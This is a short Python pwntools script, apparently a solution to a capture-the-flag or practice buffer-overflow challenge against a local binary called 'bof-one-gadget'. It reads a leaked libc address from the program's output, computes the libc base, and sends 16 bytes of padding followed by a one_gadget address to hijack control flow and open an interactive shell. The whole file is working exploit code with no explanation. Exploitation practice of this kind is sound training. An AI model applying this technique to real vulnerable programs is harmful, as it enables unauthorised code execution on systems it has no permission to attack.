from pwn import *
import pwnlib.shellcraft as shellcraft

c = process("./bof-one-gadget")

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(c)


one_gadget = 0xe6c81
c.recvuntil("Dump")

# drop 9 lines
for i in range(9):
    print("drop", c.recvline())

"""
0x007ffff7df30b3-0x007ffff7dcc000
$1 = 0x270b3
"""

addr = c.recvline().split()[-1]
libc_addr = int(addr, 16) - 0x270b3
print(hex(libc_addr))

c.recvuntil("End")

# one gadget
payload = 0x10 * b'A' + p64(one_gadget + libc_addr)
c.sendlineafter(":", payload)

c.interactive()
c.close()
